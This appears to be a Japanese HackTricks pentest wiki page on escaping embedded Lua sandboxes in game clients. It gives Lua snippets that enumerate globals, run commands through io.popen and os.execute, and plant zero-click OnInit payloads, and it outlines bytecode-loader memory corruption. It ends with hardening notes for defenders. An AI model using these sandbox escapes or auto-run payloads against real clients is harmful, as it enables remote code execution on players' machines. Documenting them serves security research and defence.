# Lua サンドボックスをバイパスする（embedded VMs, game clients）

{{#include ../../../banners/hacktricks-training.md}}

このページは、アプリケーション（特にゲームクライアント、プラグイン、またはアプリ内スクリプトエンジン）に組み込まれた Lua の「サンドボックス」を列挙し脱出するための実践的な手法をまとめたものです。多くのエンジンは制限された Lua 環境を公開しますが、強力なグローバルが到達可能なままで、bytecode loaders が公開されている場合には任意のコマンド実行やネイティブメモリ破壊を引き起こす可能性があります。

Key ideas:
- VM を未知の環境として扱う: _G を列挙し、どの危険なプリミティブにアクセスできるかを発見する。
- stdout/print がブロックされている場合、in-VM の UI/IPC チャネルを出力先として悪用し結果を観察する。
- io/os が公開されている場合、通常は直接コマンド実行が可能（io.popen、os.execute）。
- load/loadstring/loadfile が公開されている場合、細工した Lua バイトコードを実行することで一部のバージョンでメモリ安全性を破ることができる（≤5.1 verifiers はバイパス可能；5.2 では verifier が削除されている）、これにより高度なエクスプロイトが可能になる。

## Enumerate the sandboxed environment

- グローバル環境をダンプして到達可能なテーブル/関数を列挙する:
```lua
-- Minimal _G dumper for any Lua sandbox with some output primitive `out`
local function dump_globals(out)
out("=== DUMPING _G ===")
for k, v in pairs(_G) do
out(tostring(k) .. " = " .. tostring(v))
end
end
```
- print() が利用できない場合は、in-VM channels を転用する。MMO の housing script VM の例では、チャット出力はサウンド呼び出しの後でしか動作しないため、以下は信頼性の高い出力関数を構築する例です:
```lua
-- Build an output channel using in-game primitives
local function ButlerOut(label)
-- Some engines require enabling an audio channel before speaking
H.PlaySound(0, "r[1]") -- quirk: required before H.Say()
return function(msg)
H.Say(label or 1, msg)
end
end

function OnMenu(menuNum)
if menuNum ~= 3 then return end
local out = ButlerOut(1)
dump_globals(out)
end
```
ターゲットに合わせてこのパターンを一般化する：任意の textbox、toast、logger、または UI callback が strings を受け取る場合、それらは reconnaissance の stdout として機能し得る。

## Direct command execution if io/os is exposed

もし sandbox が依然として標準ライブラリ io や os を公開しているなら、おそらく即座に command execution が可能です:
```lua
-- Windows example
io.popen("calc.exe")

-- Cross-platform variants depending on exposure
os.execute("/usr/bin/id")
io.popen("/bin/sh -c 'id'")
```
注意:
- 実行は client process 内で行われる。external debuggers をブロックする多くの anti-cheat/antidebug レイヤーでも、in-VM process creation を防げないことが多い。
- また確認すべきもの: package.loadlib（arbitrary DLL/.so loading）、require（native modules を伴う場合）、LuaJIT's ffi（存在する場合）、および the debug library（VM 内で権限を上げる可能性がある）。

## Zero-click トリガー（auto-run callbacks 経由）

If the host application pushes scripts to clients and the VM exposes auto-run hooks (e.g., OnInit/OnLoad/OnEnter), place your payload there for drive-by compromise as soon as the script loads:
```lua
function OnInit()
io.popen("calc.exe") -- or any command
end
```
スクリプトがクライアントに送信され自動的に実行される場合、任意の同等のコールバック（OnLoad、OnEnter など）がこの手法を一般化します。

## リコン中に探すべき危険なプリミティブ

_G 列挙中、特に次を探してください:
- io, os: io.popen, os.execute, file I/O, env access.
- load, loadstring, loadfile, dofile: execute source or bytecode; supports loading untrusted bytecode.
- package, package.loadlib, require: dynamic library loading and module surface.
- debug: setfenv/getfenv (≤5.1), getupvalue/setupvalue, getinfo, and hooks.
- LuaJIT-only: ffi.cdef, ffi.load to call native code directly.

到達可能な場合の最小使用例:
```lua
-- Execute source/bytecode
local f = load("return 1+1")
print(f()) -- 2

-- loadstring is alias of load for strings in 5.1
local bc = string.dump(function() return 0x1337 end)
local g = loadstring(bc) -- in 5.1 may run precompiled bytecode
print(g())

-- Load native library symbol (if allowed)
local mylib = package.loadlib("./libfoo.so", "luaopen_foo")
local foo = mylib()
```
## オプションの権限昇格: Lua bytecode loaders の悪用

load/loadstring/loadfile が利用可能で io/os が制限されている場合、細工した Lua bytecode の実行によりメモリの開示や破損プリミティブにつながる可能性がある。主なポイント:

- Lua ≤ 5.1 には既知のバイパスを持つ bytecode verifier が同梱されていた。
- Lua 5.2 は verifier を完全に削除した（公式見解: アプリケーションは precompiled chunks を拒否すべき）。そのため bytecode loading を禁止していないと攻撃対象領域が拡大する。
- 一般的なワークフロー: in-VM 出力でポインタを leak し、型混同を引き起こすように bytecode を作成（例: FORLOOP やその他の opcodes 周り）、そこから arbitrary read/write やネイティブコード実行へピボットする。

この経路はエンジンやバージョンに依存し、RE を必要とする。詳細な解析、exploitation primitives、ゲーム内での例示的な gadgetry は下の参考を参照。

## Detection and hardening notes (for defenders)

- Server side: ユーザスクリプトを拒否または書き換え; safe APIs を allowlist; io, os, load/loadstring/loadfile/dofile, package.loadlib, debug, ffi を削除するか空バインドにする。
- Client side: 最小限の _ENV で Lua を実行し、bytecode loading を禁止、厳格な bytecode verifier や署名チェックを再導入し、クライアントプロセスからのプロセス生成をブロックする。
- Telemetry: script load の直後に gameclient → child process の生成があればアラートを上げ、UI/chat/script イベントと相関させる。

## References

- [This House is Haunted: a decade old RCE in the AION client (housing Lua VM)](https://appsec.space/posts/aion-housing-exploit/)
- [Bytecode Breakdown: Unraveling Factorio's Lua Security Flaws](https://memorycorruption.net/posts/rce-lua-factorio/)
- [lua-l (2009): Discussion on dropping the bytecode verifier](https://web.archive.org/web/20230308193701/https://lua-users.org/lists/lua-l/2009-03/msg00039.html)
- [Exploiting Lua 5.1 bytecode (gist with verifier bypasses/notes)](https://gist.github.com/ulidtko/51b8671260db79da64d193e41d7e7d16)

{{#include ../../../banners/hacktricks-training.md}}
